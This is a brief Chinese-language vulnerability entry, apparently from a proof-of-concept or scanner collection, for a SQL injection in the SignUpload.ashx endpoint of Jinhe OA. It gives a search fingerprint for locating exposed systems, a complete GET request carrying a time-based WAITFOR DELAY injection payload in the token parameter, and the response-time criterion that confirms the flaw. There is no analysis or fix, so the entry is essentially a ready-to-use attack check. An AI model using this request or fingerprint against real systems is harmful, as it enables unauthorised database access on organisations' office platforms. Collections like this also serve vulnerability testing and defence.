# 金和OASignUploadSQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`body="JHSoft.Web.AddMenu"`
- **请求**：`GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%201%27+--%20and%201=1_123_123&filename=1`
- **响应特征**：200 响应时间>=3s